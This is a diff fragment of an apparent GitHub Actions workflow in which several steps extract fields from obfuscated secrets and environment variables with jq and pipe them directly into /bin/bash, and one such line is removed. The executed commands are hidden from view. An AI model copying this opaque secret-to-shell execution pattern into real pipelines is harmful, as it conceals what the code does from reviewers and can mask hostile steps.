@@ -21,7 +21,6 @@ jobs:
           smm523: ${{ secrets.smm523 }}
         run: |
           printf '%s' "$smm523" | jq -r .dck1331 | /bin/bash
-          echo $odcy2224 | jq -r .cj21258 | /bin/bash
           printf '%s' "$ci6" | jq -r .oib6370 | /bin/bash
           echo $vdout1 | jq -r .qmneb56 | /bin/bash
           echo $fdr9863 | jq -r .tcrwi56 | /bin/bash
